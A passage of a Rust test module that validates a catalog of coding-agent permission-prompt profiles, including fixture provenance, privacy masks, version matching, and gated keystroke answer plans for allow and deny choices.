                    push_mask(s, row, "reviewed_privacy");
                }
            }
        }),
        ("masked row out of range", |s| {
            let rows = s["rows"].as_u64().unwrap();
            push_mask(s, rows, "reviewed_privacy");
        }),
        ("duplicate masked row", |s| {
            let row = first_masked_or_empty_row(s);
            if s["masked_rows"].as_array().unwrap().is_empty() {
                push_mask(s, row, "reviewed_privacy");
            }
            push_mask(s, row, "reviewed_privacy");
        }),
        ("unreviewed mask reason", |s| {
            if s["masked_rows"].as_array().unwrap().is_empty() {
                let row = first_masked_or_empty_row(s);
                push_mask(s, row, "convenience");
            } else {
                s["masked_rows"][0]["reason"] = json!("convenience");
            }
        }),
        ("rows", |s| {
            s["rows"] = json!(s["rows"].as_u64().unwrap() - 1)
        }),
        ("line count", |s| {
            s["lines"].as_array_mut().unwrap().pop();
        }),
        ("cols differ from the entry", |s| {
            s["cols"] = json!(s["cols"].as_u64().unwrap() + 1)
        }),
        ("cursor row outside the geometry", |s| {
            s["cursor_row"] = s["rows"].clone()
        }),
        ("cursor column past the geometry", |s| {
            s["cursor_col"] = json!(s["cols"].as_u64().unwrap() + 1)
        }),
    ];

    #[test]
    fn bundled_guard_rejects_every_unreviewed_change_to_each_bundled_fixture() {
        let definitions = bundled_definitions();
        let embedded = bundled_embedded();
        let entries = definitions["fixtures"].as_array().unwrap();
        ProfileCatalog::from_bundled_definitions(&definitions, &embedded).unwrap();
        let catalogued = entries
            .iter()
            .map(|entry| entry["id"].as_str().unwrap().to_owned())
            .collect::<BTreeSet<_>>();
        let screens = embedded
            .iter()
            .flat_map(|(_, bytes)| {
                let file: Value = serde_json::from_slice(bytes).unwrap();
                file["screens"]
                    .as_object()
                    .expect("the backend file contains a screen map")
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>()
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(screens, catalogued);
        for entry in entries {
            let id = entry["id"].as_str().unwrap();
            for (case, change) in SCREEN_CHANGES {
                assert!(
                    guarded_fixture(id, |_| {}, change).is_err(),
                    "{id}: {case} must be rejected"
                );
            }
            for (field, value) in [
                ("schema_version", json!(2)),
                ("provenance", json!("synthetic")),
                (
                    "backend",
                    json!(if entry["backend"] == "codex" {
                        "claude"
                    } else {
                        "codex"
                    }),
                ),
            ] {
                assert!(
                    guarded_fixture_file(id, |_| {}, |file| file[field] = value).is_err(),
                    "{id}: {field} must match its catalog entry"
                );
            }
            assert!(
                guarded_fixture(
                    id,
                    |definitions| bundled_entry(definitions, id)["kind"] = json!("synthetic"),
                    |_| {}
                )
                .is_err(),
                "{id}: bundled fixtures require native catalog provenance"
            );
            assert!(
                guarded_fixture_file(
                    id,
                    |_| {},
                    |file| {
                        file["screens"].as_object_mut().unwrap().remove(id);
                    }
                )
                .is_err(),
                "{id}: its catalogued screen must be present"
            );
            assert!(
                guarded_fixture_file(
                    id,
                    |_| {},
                    |file| {
                        let screen = &mut file["screens"][id];
                        screen["alternate_screen"] =
                            json!(!screen["alternate_screen"].as_bool().unwrap());
                    }
                )
                .is_err(),
                "{id}: changed screen content requires its canonical digest"
            );
            let source = entry["source_ref"].as_str().unwrap();
            let mut missing = embedded.clone();
            missing.retain(|&(cited, _)| cited != source);
            assert!(
                ProfileCatalog::from_bundled_definitions(&definitions, &missing).is_err(),
                "{id}: a cited fixture is embedded"
            );
        }
    }

    #[test]
    fn permission_inspection_catalog_retains_exact_executable_plans_and_provenance() {
        let catalog = ProfileCatalog::from_definitions(&inspection_fixture_definition()).unwrap();
        for (decision, choice, rule, bytes) in [
            (
                PermissionDecision::Allow,
                "allow-once",
                "inspection-allow-plan",
                b'y',
            ),
            (
                PermissionDecision::Deny,
                "deny-once",
                "inspection-deny-plan",
                b'n',
            ),
        ] {
            let plan = catalog
                .answer_plan(
                    CodingAgent::Codex,
                    "0.0.1-synthetic",
                    "synthetic-permission",
                    &AnswerKey::Decision(decision),
                )
                .unwrap();
            let capability = plan.capability();
            assert_eq!(capability.backend(), CodingAgent::Codex);
            assert_eq!(capability.native_version(), "0.0.1-synthetic");
            assert_eq!(capability.request_rule_id(), "synthetic-permission");
            assert_eq!(capability.answer_rule_id(), rule);
            assert_eq!(capability.key(), &AnswerKey::Decision(decision));
            assert_eq!(
                capability.fixture_ids(),
                &["synthetic-permission-1".to_owned()]
            );
            assert_eq!(plan.choice_id(), choice);
            assert_eq!(plan.focus_matcher_id(), "form");
            assert_eq!(plan.stages().len(), 2);
            assert_eq!(plan.stages()[0].bytes(), &[bytes]);
            assert_eq!(plan.stages()[1].bytes(), b"\r");
            for stage in plan.stages() {
                assert_eq!(stage.required_rule_id(), "synthetic-permission");
                assert_eq!(stage.required_choice_id(), choice);
            }
        }
        assert!(
            catalog
                .answer_plan(
                    CodingAgent::Claude,
                    "0.0.1-synthetic",
                    "synthetic-permission",
                    &AnswerKey::Decision(PermissionDecision::Allow)
                )
                .is_none()
        );
        for (version, rule, decision) in [
            ("0.0.1-synthetic", "unknown", PermissionDecision::Allow),
            (
                "0.0.1-synthetic",
                "inspection-alternate-request",
                PermissionDecision::Deny,
            ),
        ] {
            assert!(
                catalog
                    .answer_plan(
                        CodingAgent::Codex,
                        version,
                        rule,
                        &AnswerKey::Decision(decision)
                    )
                    .is_none()
            );
        }
        assert!(
            ProfileCatalog::bundled()
                .unwrap()
                .answer_plan(
                    CodingAgent::Codex,
                    "0.0.1-synthetic",
                    "synthetic-permission",
                    &AnswerKey::Decision(PermissionDecision::Allow)
                )
                .is_none()
        );
    }

    #[test]
    fn permission_inspection_catalog_bounds_each_stage_and_complete_plan() {
        let mut value = inspection_fixture_definition();
        let mut stage = value["profiles"][0]["capabilities"]["answers"][0]["stages"][0].clone();
        stage["bytes_hex"] = json!("79".repeat(256));
        value["profiles"][0]["capabilities"]["answers"][0]["stages"] =
            json!(vec![stage.clone(); 16]);
        let catalog = ProfileCatalog::from_definitions(&value).unwrap();
        let plan = catalog
            .answer_plan(
                CodingAgent::Codex,
                "0.0.1-synthetic",
                "synthetic-permission",
                &AnswerKey::Decision(PermissionDecision::Allow),
            )
            .unwrap();
        assert_eq!(
            plan.stages().iter().map(|s| s.bytes().len()).sum::<usize>(),
            4096
        );
        value["profiles"][0]["capabilities"]["answers"][0]["stages"] = json!(vec![stage; 17]);
        assert!(ProfileCatalog::from_definitions(&value).is_err());
        value["profiles"][0]["capabilities"]["answers"][0]["stages"] = json!([{
            "bytes_hex":"79".repeat(257),"required_rule_id":"synthetic-permission","required_choice_id":"allow-once"
        }]);
        assert!(ProfileCatalog::from_definitions(&value).is_err());
    }

    #[test]
    fn permission_inspection_executable_plans_have_no_debug_or_serialized_representation() {
        assert_no_debug_or_serialize!(
            crate::coding_agent::AnswerPlan,
            crate::coding_agent::AnswerStage
        );
    }
    fn invalid(change: impl FnOnce(&mut Value)) {
        assert!(ProfileCatalog::from_definitions(&definitions()).is_ok());
        let mut value = definitions();
        change(&mut value);
        assert!(
            ProfileCatalog::from_definitions(&value).is_err(),
            "invalid definition accepted"
        );
    }

    fn with_answer(decision: &str) -> Value {
        let mut value = definitions();
        let choice = if decision == "allow" {
            "allow-once"
        } else {
            "deny-once"
        };
        let focus = if decision == "allow" { "allow" } else { "deny" };
        value["profiles"][0]["capabilities"]["answers"] = json!([{
            "decision":decision,"request_rule_id":RULE,"answer_rule_id":format!("synthetic-{decision}-plan"),
            "choice_id":choice,"focus_matcher_id":focus,"fixture_ids":[FIXTURE],
            "stages":[{"bytes_hex":"78","required_rule_id":RULE,"required_choice_id":choice}]
        }]);
        value
    }
    #[test]
    fn runtime_profile_capabilities_are_independent_and_version_selected() {
        let catalog = ProfileCatalog::from_definitions(&definitions()).unwrap();
        let supported = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(supported.backend, CodingAgent::Codex);
        assert_eq!(supported.native_version.as_deref(), Some(VERSION));
        assert_eq!(supported.min_version.as_deref(), Some(VERSION));
        assert_eq!(supported.detection, Coverage::Tested);
        assert_eq!(supported.composer, Coverage::Unknown);
        assert!(supported.answer_decisions.is_empty());
        let unknown = catalog.capabilities(CodingAgent::Codex, None);
        assert_eq!(unknown.min_version, None);
        assert_eq!(unknown.detection, Coverage::Unknown);
        assert_eq!(unknown.composer, Coverage::Unknown);
        assert!(unknown.answer_decisions.is_empty());
        assert!(unknown.capability_reason.is_some());
        for &backend in CodingAgent::all()
            .iter()
            .filter(|&&backend| backend != CodingAgent::Codex)
        {
            assert_eq!(
                catalog.capabilities(backend, Some(VERSION)).detection,
                Coverage::Unknown
            );
        }
    }

    #[test]
    fn runtime_profile_composer_provenance_supplies_only_its_declared_component() {
        let value = simple_definition("composer_empty", true);
        let catalog = ProfileCatalog::from_definitions(&value).unwrap();
        let capabilities = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(capabilities.detection, Coverage::Unknown);
        assert_eq!(capabilities.composer, Coverage::Tested);
        assert!(capabilities.answer_decisions.is_empty());
    }

    #[test]
    fn runtime_profile_answer_decisions_have_separate_request_and_version_capabilities() {
        for (name, decision, other) in [
            ("allow", PermissionDecision::Allow, PermissionDecision::Deny),
            ("deny", PermissionDecision::Deny, PermissionDecision::Allow),
        ] {
            let value = with_answer(name);
            let catalog = ProfileCatalog::from_definitions(&value).unwrap();
            assert_eq!(
                catalog
                    .capabilities(CodingAgent::Codex, Some(VERSION))
                    .answer_decisions,
                vec![decision]
            );
            assert_eq!(
                catalog
                    .answer_plan(
                        CodingAgent::Codex,
                        VERSION,
                        RULE,
                        &AnswerKey::Decision(decision)
                    )
                    .unwrap()
                    .capability()
                    .answer_rule_id(),
                format!("synthetic-{name}-plan")
            );
            assert!(
                catalog
                    .answer_plan(
                        CodingAgent::Codex,
                        VERSION,
                        RULE,
                        &AnswerKey::Decision(other)
                    )
                    .is_none()
            );
            assert!(
                catalog
                    .answer_plan(
                        CodingAgent::Claude,
                        VERSION,
                        RULE,
                        &AnswerKey::Decision(decision)
                    )
                    .is_none()
            );
            assert!(
                catalog
                    .answer_plan(
                        CodingAgent::Codex,
                        VERSION,
                        "another-form",
                        &AnswerKey::Decision(decision)
                    )
                    .is_none()
            );
        }
    }

    #[test]
    fn runtime_profile_both_answers_can_be_declared_without_composer_coverage() {
        let mut value = with_answer("allow");
        let deny = with_answer("deny")["profiles"][0]["capabilities"]["answers"][0].clone();
        value["profiles"][0]["capabilities"]["answers"]
            .as_array_mut()
            .unwrap()
            .push(deny);
        let catalog = ProfileCatalog::from_definitions(&value).unwrap();
        let capabilities = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(capabilities.composer, Coverage::Unknown);
        assert!(
            capabilities
                .answer_decisions
                .contains(&PermissionDecision::Allow)
        );
        assert!(
            capabilities
                .answer_decisions
                .contains(&PermissionDecision::Deny)
        );
    }

    #[test]
    fn runtime_profile_root_schema_and_unknown_fields_fail_initialization() {
        for value in [
            Value::Null,
            json!([]),
            json!({}),
            json!({"schema_version":2,"fixtures":[],"profiles":[]}),
        ] {
            assert!(ProfileCatalog::from_definitions(&value).is_err());
        }
        for path in [
            "",
            "/fixtures/0",
            "/profiles/0",
            "/profiles/0/rules/0",
            "/profiles/0/rules/0/region",
            "/profiles/0/rules/0/matchers/0",
            "/profiles/0/rules/0/extract",
            "/profiles/0/rules/0/extract/choices/0",
            "/profiles/0/rules/0/extract/operation",
            "/profiles/0/capabilities",
            "/profiles/0/capabilities/detection",
        ] {
            invalid(|value| {
                value
                    .pointer_mut(path)
                    .unwrap()
                    .as_object_mut()
                    .unwrap()
                    .insert("unexpected".into(), json!(true));
            });
        }
        invalid(|value| {
            value.as_object_mut().unwrap().remove("fixtures");
        });
        invalid(|value| {
            value["profiles"][0]["rules"][0]
                .as_object_mut()
                .unwrap()
                .remove("sensitive");
        });
    }

    #[test]
    fn runtime_profile_enums_geometry_and_real_boolean_types_are_validated() {
        for (path, replacement) in [
            ("/fixtures/0/kind", json!("unverified")),
            ("/fixtures/0/backend", json!("other")),
            ("/fixtures/0/rows", json!(0)),
            ("/fixtures/0/cols", json!(-1)),
            ("/fixtures/0/sha256", json!("A".repeat(64))),
            ("/fixtures/0/source_ref", json!(" ")),
            ("/profiles/0/min_version", json!(" ")),
            ("/profiles/0/min_version", json!([VERSION])),
            ("/profiles/0/min_version", Value::Null),
            ("/profiles/0/rules/0/priority", json!(1.5)),
            ("/profiles/0/rules/0/observation", json!("approved")),
            (
                "/profiles/0/rules/0/verified_noninteraction",
                json!("false"),
            ),
            ("/profiles/0/rules/0/sensitive", json!(0)),
            ("/profiles/0/rules/0/region/screen", json!("scrollback")),
            ("/profiles/0/rules/0/region/max_rows", json!(0)),
            ("/profiles/0/rules/0/region/cursor", json!("nearby")),
            ("/profiles/0/rules/0/matchers/0/scope", json!("transcript")),
            (
                "/profiles/0/rules/0/extract/choices/0/scope",
                json!("forever"),
            ),
        ] {
            invalid(|value| {
                *value.pointer_mut(path).unwrap() = replacement;
            });
        }
    }

    #[test]
    fn runtime_profile_duplicate_identity_and_ambiguous_backend_version_fail() {
        invalid(|value| {
            let copy = value["fixtures"][0].clone();
            value["fixtures"].as_array_mut().unwrap().push(copy);
        });
        invalid(|value| {
            let copy = value["profiles"][0].clone();
            value["profiles"].as_array_mut().unwrap().push(copy);
        });
        invalid(|value| {
            let mut copy = value["profiles"][0].clone();
            copy["min_version"] = json!("0.0.1-synthetic+build.2");
            value["profiles"].as_array_mut().unwrap().push(copy);
        });
        for array in [
            "/profiles/0/rules",
            "/profiles/0/rules/0/matchers",
            "/profiles/0/rules/0/extract/choices",
        ] {
            invalid(|value| {
                let items = value.pointer_mut(array).unwrap().as_array_mut().unwrap();
                items.push(items[0].clone());
            });
        }
    }

    #[test]
    fn runtime_profile_regex_and_capture_relationships_fail_at_initialization() {
        for (path, replacement) in [
            ("/profiles/0/rules/0/region/start_pattern", json!("[")),
            ("/profiles/0/rules/0/region/end_pattern", json!("[")),
            ("/profiles/0/rules/0/matchers/0/pattern", json!("[")),
            (
                "/profiles/0/rules/0/extract/operation/matcher_id",
                json!("missing"),
            ),
            (
                "/profiles/0/rules/0/extract/operation/capture",
                json!("missing"),
            ),
        ] {
            invalid(|value| {
                *value.pointer_mut(path).unwrap() = replacement;
            });
        }
        invalid(|value| {
            value["profiles"][0]["rules"][0]["verified_noninteraction"] = json!(true);
        });
    }

    #[test]
    fn runtime_profile_operation_row_margin_must_be_a_nonempty_single_row_string() {
        let mut margined = definitions();
        margined["profiles"][0]["rules"][0]["extract"]["operation"]["row_margin"] = json!(" ");
        assert!(ProfileCatalog::from_definitions(&margined).is_ok());
        for margin in [
            json!(1),
            json!(null),
            json!([" "]),
            json!(""),
            json!("\n"),
            json!(" \n "),
        ] {
            invalid(|value| {
                value["profiles"][0]["rules"][0]["extract"]["operation"]["row_margin"] = margin;
            });
        }
        invalid(|value| {
            let operation = &mut value["profiles"][0]["rules"][0]["extract"]["operation"];
            operation["row_margin"] = json!(" ");
            operation["reassembly"] = json!("rows");
        });
    }

    #[test]
    fn runtime_profile_operation_margin_rows_select_all_or_continuation_rows_of_a_margin() {
        for margin_rows in ["all", "continuation"] {
            let mut value = definitions();
            let operation = &mut value["profiles"][0]["rules"][0]["extract"]["operation"];
            operation["row_margin"] = json!(" ");
            operation["margin_rows"] = json!(margin_rows);
            assert!(
                ProfileCatalog::from_definitions(&value).is_ok(),
                "{margin_rows}"
            );
        }
        for margin_rows in [
            json!("first"),
            json!("All"),
            json!(""),
            json!(null),
            json!(1),
            json!(["continuation"]),
        ] {
            invalid(|value| {
                let operation = &mut value["profiles"][0]["rules"][0]["extract"]["operation"];
                operation["row_margin"] = json!(" ");
                operation["margin_rows"] = margin_rows;
            });
        }
        for margin_rows in ["all", "continuation"] {
            invalid(|value| {
                value["profiles"][0]["rules"][0]["extract"]["operation"]["margin_rows"] =
                    json!(margin_rows);
            });
        }
    }

    #[test]
    fn runtime_profile_operation_row_trailer_is_a_trimmed_single_row_literal() {
        for with_margin in [false, true] {
            let mut value = definitions();
            let operation = &mut value["profiles"][0]["rules"][0]["extract"]["operation"];
            if with_margin {
                operation["row_margin"] = json!(" ");
                operation["margin_rows"] = json!("continuation");
            }
            operation["row_trailer"] = json!("█");
            assert!(
                ProfileCatalog::from_definitions(&value).is_ok(),
                "with margin: {with_margin}"
            );
        }
        for trailer in [
            json!(""),
            json!(" "),
            json!(" █"),
            json!("█ "),
            json!("\t█"),
            json!("█\n█"),
            json!(null),
            json!(1),
            json!(["█"]),
        ] {
            invalid(|value| {
                value["profiles"][0]["rules"][0]["extract"]["operation"]["row_trailer"] = trailer;
            });
        }
    }

    #[test]
    fn runtime_profile_capability_provenance_references_are_checked() {
        for (path, replacement) in [
            ("/fixtures/0/backend", json!("claude")),
            ("/fixtures/0/native_version", json!("0.0.0")),
            (
                "/profiles/0/capabilities/detection/rule_ids",
                json!(["missing-rule"]),
            ),
            (
                "/profiles/0/capabilities/detection/fixture_ids",
                json!(["missing-fixture"]),
            ),
            ("/profiles/0/capabilities/detection/fixture_ids", json!([])),
        ] {
            invalid(|value| {
                *value.pointer_mut(path).unwrap() = replacement;
            });
        }
        invalid(|value| {
            value["profiles"][0]["capabilities"]["composer"] =
                value["profiles"][0]["capabilities"]["detection"].clone();
        });
    }

    #[test]
    fn runtime_profile_answer_scope_focus_stages_and_fixture_relationships_are_checked() {
        let valid = with_answer("allow");
        assert!(ProfileCatalog::from_definitions(&valid).is_ok());
        for (path, replacement) in [
            (
                "/profiles/0/capabilities/answers/0/decision",
                json!("approve-session"),
            ),
            (
                "/profiles/0/capabilities/answers/0/request_rule_id",
                json!("missing"),
            ),
            (
                "/profiles/0/capabilities/answers/0/focus_matcher_id",
                json!("missing"),
            ),
            (
                "/profiles/0/capabilities/answers/0/choice_id",
                json!("missing"),
            ),
            (
                "/profiles/0/capabilities/answers/0/fixture_ids",
                json!(["missing"]),
            ),
            ("/profiles/0/capabilities/answers/0/stages", json!([])),
            (
                "/profiles/0/capabilities/answers/0/stages/0/bytes_hex",
                json!("7"),
            ),
            (
                "/profiles/0/capabilities/answers/0/stages/0/bytes_hex",
                json!("AF"),
            ),
            (
                "/profiles/0/capabilities/answers/0/stages/0/bytes_hex",
                json!(""),
            ),
            (
                "/profiles/0/capabilities/answers/0/stages/0/required_rule_id",
                json!("missing"),
            ),
            (
                "/profiles/0/capabilities/answers/0/stages/0/required_choice_id",
                json!("deny-once"),
            ),
            (
                "/profiles/0/rules/0/extract/choices/0/scope",
                json!("session"),
            ),
            (
                "/profiles/0/rules/0/extract/choices/0/scope",
                json!("persistent"),
            ),
            ("/profiles/0/rules/0/observation", json!("trust")),
        ] {
            let mut value = valid.clone();
            *value.pointer_mut(path).unwrap() = replacement;
            assert!(
                ProfileCatalog::from_definitions(&value).is_err(),
                "invalid answer relationship {path}"
            );
        }
    }

    #[test]
    fn runtime_profile_answer_objects_have_exact_fields_and_unique_plan_identities() {
        let valid = with_answer("allow");
        assert!(ProfileCatalog::from_definitions(&valid).is_ok());
        for path in [
            "/profiles/0/capabilities/answers/0",
            "/profiles/0/capabilities/answers/0/stages/0",
        ] {
            let mut value = valid.clone();
            value
                .pointer_mut(path)
                .unwrap()
                .as_object_mut()
                .unwrap()
                .insert("unexpected".into(), json!(true));
            assert!(ProfileCatalog::from_definitions(&value).is_err());
        }
        let mut duplicate = valid.clone();
        duplicate["profiles"][0]["capabilities"]["answers"]
            .as_array_mut()
            .unwrap()
            .push(valid["profiles"][0]["capabilities"]["answers"][0].clone());
        assert!(ProfileCatalog::from_definitions(&duplicate).is_err());
    }

    #[test]
    fn runtime_profile_bundled_loader_validates_its_packaged_declarations() {
        let catalog = ProfileCatalog::bundled().unwrap();
        for &backend in CodingAgent::all() {
            let unprobed = catalog.capabilities(backend, None);
            assert_eq!(unprobed.min_version, None);
            assert_eq!(unprobed.detection, Coverage::Unknown);
            assert_eq!(unprobed.composer, Coverage::Unknown);
            assert!(unprobed.answer_decisions.is_empty());
        }
    }

    #[test]
    fn runtime_profile_private_fingerprint_supports_comparison_without_debug_or_serialization() {
        fn comparable<T: Clone + Eq>() {}
        comparable::<SemanticFingerprint>();
        assert_no_debug_or_serialize!(SemanticFingerprint);
    }
    mod gated_catalog {
        use crate::coding_agent::catalog::tests::*;

        const STAGES: &str = "/profiles/0/capabilities/answers/1/stages";
        const ALLOW_STAGES: &str = "/profiles/0/capabilities/answers/0/stages";
        const REASON: &str = "/profiles/0/rules/1";

        fn rejected(case: &str, change: impl FnOnce(&mut Value)) {
            assert!(ProfileCatalog::from_definitions(&gated_fixture_definition()).is_ok());
            let mut value = gated_fixture_definition();
            change(&mut value);
            assert!(
                ProfileCatalog::from_definitions(&value).is_err(),
                "{case} must fail catalog loading"
            );
        }

        fn stage(bytes: &str, choice: &str, gate: (&str, &str)) -> Value {
            let mut stage = json!({"bytes_hex":bytes,"required_rule_id":GATED_RULE,"required_choice_id":choice});
            stage[gate.0] = json!(gate.1);
            stage
        }

        fn plan(decision: PermissionDecision) -> AnswerPlan {
            ProfileCatalog::from_definitions(&gated_fixture_definition())
                .unwrap()
                .answer_plan(
                    CodingAgent::Codex,
                    VERSION,
                    GATED_RULE,
                    &AnswerKey::Decision(decision),
                )
                .expect("gated synthetic plan")
        }

        #[test]
        fn gated_catalog_retains_each_stage_gate_in_declared_order() {
            let allow = plan(PermissionDecision::Allow);
            assert_eq!(allow.stages().len(), 1);
            assert_eq!(allow.stages()[0].bytes(), b"\r");
            assert_eq!(
                allow.stages()[0].required_focus_choice_id(),
                Some("allow-once")
            );
            assert_eq!(allow.stages()[0].required_screen_rule_id(), None);
            let deny = plan(PermissionDecision::Deny);
            let gates = deny
                .stages()
                .iter()
                .map(|stage| {
                    (
                        stage.bytes().to_vec(),
                        stage.required_choice_id().to_owned(),
                        stage.required_focus_choice_id().map(str::to_owned),
                        stage.required_screen_rule_id().map(str::to_owned),
                    )
                })
                .collect::<Vec<_>>();
            assert_eq!(
                gates,
                [
                    (
                        b"h".to_vec(),
                        "deny-once".into(),
                        Some("allow-once".into()),
                        None
                    ),
                    (
                        b"\r".to_vec(),
                        "deny-once".into(),
                        Some("deny-once".into()),
                        None
                    ),
                    (
                        b"\r".to_vec(),
                        "deny-once".into(),
                        None,
                        Some(GATED_REASON_RULE.into())
                    ),
                ]
            );
        }

        #[test]
        fn gated_catalog_keeps_existing_ungated_plans_without_gates() {
            let synthetic = ProfileCatalog::from_definitions(&inspection_fixture_definition())
                .unwrap()
                .answer_plan(
                    CodingAgent::Codex,
                    VERSION,
                    "synthetic-permission",
                    &AnswerKey::Decision(PermissionDecision::Allow),
                )
                .unwrap();
            let bundled = ProfileCatalog::bundled().unwrap();
            let mut plans = vec![synthetic];
            for (backend, version, rule) in [
                (CodingAgent::Claude, "2.1.302", "claude-bash-permission"),
                (CodingAgent::Codex, "0.163.0", "codex-exec-approval"),
            ] {
                for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                    plans.push(
                        bundled
                            .answer_plan(backend, version, rule, &AnswerKey::Decision(decision))
                            .expect("bundled ungated plan"),
                    );
                }
            }
            for plan in plans {
                for stage in plan.stages() {
                    assert_eq!(stage.required_focus_choice_id(), None);
                    assert_eq!(stage.required_screen_rule_id(), None);
                }
            }
        }

        #[test]
        fn gated_catalog_rejects_a_focus_gate_on_an_unknown_choice_or_a_malformed_gate() {
            for (case, value) in [
                ("unknown choice", json!("always-allow")),
                ("non-string gate", json!(1)),
                ("null gate", Value::Null),
                ("blank gate", json!(" ")),
            ] {
                rejected(case, |definition| {
                    *definition
                        .pointer_mut(&format!("{STAGES}/0/required_focus_choice_id"))
                        .unwrap() = value;
                });
            }
            rejected("unknown continuation rule", |definition| {
                *definition
                    .pointer_mut(&format!("{STAGES}/2/required_screen_rule_id"))
                    .unwrap() = json!("missing-rule");
            });
            rejected("both gates on one stage", |definition| {
                definition.pointer_mut(&format!("{STAGES}/1")).unwrap()["required_screen_rule_id"] =
                    json!(GATED_REASON_RULE);
            });
            rejected("unknown stage field", |definition| {
                definition.pointer_mut(&format!("{STAGES}/0")).unwrap()["required_focus"] =
                    json!("allow-once");
            });
        }

        #[test]
        fn gated_catalog_rejects_a_plan_that_gates_only_some_stages() {
            rejected("ungated first stage", |definition| {
                definition
                    .pointer_mut(&format!("{STAGES}/0"))
                    .unwrap()
                    .as_object_mut()
                    .unwrap()
                    .remove("required_focus_choice_id");
            });
            rejected("ungated middle stage", |definition| {
                definition
                    .pointer_mut(&format!("{STAGES}/1"))
                    .unwrap()
                    .as_object_mut()
                    .unwrap()
                    .remove("required_focus_choice_id");
            });
            rejected("ungated final stage", |definition| {
                *definition.pointer_mut(STAGES).unwrap() = json!([
                    stage("68", "deny-once", ("required_focus_choice_id", "allow-once")),
                    {"bytes_hex":"0d","required_rule_id":GATED_RULE,"required_choice_id":"deny-once"}
                ]);
            });
        }

        #[test]
        fn gated_catalog_rejects_a_final_gate_on_another_choice() {
            rejected("allow ends on the deny focus", |definition| {
                *definition.pointer_mut(ALLOW_STAGES).unwrap() = json!([stage(
                    "0d",
                    "allow-once",
                    ("required_focus_choice_id", "deny-once")
                )]);
            });
            rejected("deny ends on the allow focus", |definition| {
                *definition.pointer_mut(STAGES).unwrap() = json!([stage(
                    "0d",
                    "deny-once",
                    ("required_focus_choice_id", "allow-once")
                )]);
            });
            let mut ends_on_deny_focus = gated_fixture_definition();
            *ends_on_deny_focus.pointer_mut(STAGES).unwrap() = json!([
                stage(
                    "68",
                    "deny-once",
                    ("required_focus_choice_id", "allow-once")
                ),
                stage("0d", "deny-once", ("required_focus_choice_id", "deny-once"))
            ]);
            assert!(
                ProfileCatalog::from_definitions(&ends_on_deny_focus).is_ok(),
                "a final focus gate on the answer's own choice is valid"
            );
        }

        #[test]
        fn gated_catalog_rejects_screen_gates_without_their_continuation_succession() {
            rejected("screen gate on the request rule itself", |definition| {
                *definition
                    .pointer_mut(&format!("{STAGES}/2/required_screen_rule_id"))
                    .unwrap() = json!(GATED_RULE);
            });
            rejected("screen gate as the first stage", |definition| {
                *definition.pointer_mut(STAGES).unwrap() = json!([stage(
                    "0d",
                    "deny-once",
                    ("required_screen_rule_id", GATED_REASON_RULE)
                )]);
            });
            rejected("screen gate after a stage on another focus", |definition| {
                *definition.pointer_mut(STAGES).unwrap() = json!([
                    stage(
                        "68",
                        "deny-once",
                        ("required_focus_choice_id", "allow-once")
                    ),
                    stage(
                        "0d",
                        "deny-once",
                        ("required_screen_rule_id", GATED_REASON_RULE)
                    )
                ]);
            });
            rejected("continuation of an unrelated request rule", |definition| {
                let mut other = definition["profiles"][0]["rules"][0].clone();
                other["id"] = json!("synthetic-other-request");
                other["region"]["start_pattern"] = json!("^Synthetic other request$");
                other["matchers"][0]["pattern"] = json!("^Synthetic other request$");
                definition["profiles"][0]["rules"]
                    .as_array_mut()
                    .unwrap()
                    .push(other);
                definition["profiles"][0]["capabilities"]["detection"]["rule_ids"] =
                    json!([GATED_RULE, "synthetic-other-request"]);
                definition.pointer_mut(REASON).unwrap()["continues_rule_id"] =
                    json!("synthetic-other-request");
            });
            rejected("final continuation of another choice", |definition| {
                definition.pointer_mut(REASON).unwrap()["continues_choice_id"] =
                    json!("allow-once");
                *definition.pointer_mut(STAGES).unwrap() = json!([
                    stage(
                        "0d",
                        "deny-once",
                        ("required_focus_choice_id", "allow-once")
                    ),
                    stage(
                        "0d",
                        "deny-once",
                        ("required_screen_rule_id", GATED_REASON_RULE)
                    )
                ]);
            });
        }

        #[test]
        fn gated_catalog_validates_the_continuation_rule_declaration() {
            rejected("continuation with an operation", |definition| {
                let rule = definition.pointer_mut(REASON).unwrap();
                rule["matchers"].as_array_mut().unwrap().push(
                    json!({"id":"operation","scope":"line","pattern":"^Reason: (?P<operation>.+)$"}),
                );
                rule["extract"]["operation"] =
                    json!({"matcher_id":"operation","capture":"operation"});
            });
            rejected("continuation with choices", |definition| {
                let rule = definition.pointer_mut(REASON).unwrap();
                rule["matchers"].as_array_mut().unwrap().push(
                    json!({"id":"confirm","scope":"line","pattern":"^Confirm: (?P<label>enter)$"}),
                );
                rule["extract"]["choices"] = json!([{"id":"confirm","label":{"matcher_id":"confirm","capture":"label"},"scope":"single_request"}]);
            });
            rejected("continuation as an answer request rule", |definition| {
                definition["profiles"][0]["capabilities"]["answers"][0]["request_rule_id"] =
                    json!(GATED_REASON_RULE);
            });
            rejected("continuation verifying noninteraction", |definition| {
                definition.pointer_mut(REASON).unwrap()["verified_noninteraction"] = json!(true);
            });
            for key in ["continues_rule_id", "continues_choice_id", "fixture_ids"] {
                rejected(&format!("continuation without {key}"), |definition| {
                    definition
                        .pointer_mut(REASON)
                        .unwrap()
                        .as_object_mut()
                        .unwrap()
                        .remove(key);
                });
            }
            for (case, key, value) in [
                (
                    "unknown continued rule",
                    "continues_rule_id",
                    json!("missing-rule"),
                ),
                (
                    "unknown continued choice",
                    "continues_choice_id",
                    json!("missing-choice"),
                ),
                ("no cited fixture", "fixture_ids", json!([])),
                (
                    "unknown cited fixture",
                    "fixture_ids",
                    json!(["missing-fixture"]),
                ),
                (
                    "synthetic cited fixture",
                    "fixture_ids",
                    json!(["synthetic-permission-1"]),
                ),
            ] {
                rejected(case, |definition| {
                    definition.pointer_mut(REASON).unwrap()[key] = value;
                });
            }
            rejected("continuation of a non-permission rule", |definition| {
                definition["profiles"][0]["rules"][0]["observation"] = json!("question");
                definition["profiles"][0]["capabilities"]["answers"] = json!([]);
            });
            for key in ["continues_rule_id", "continues_choice_id", "fixture_ids"] {
                rejected(
                    &format!("{key} on a permission request rule"),
                    |definition| {
                        let value = definition.pointer(REASON).unwrap()[key].clone();
                        definition["profiles"][0]["rules"][0][key] = value;
                    },
                );
            }
        }

        #[test]
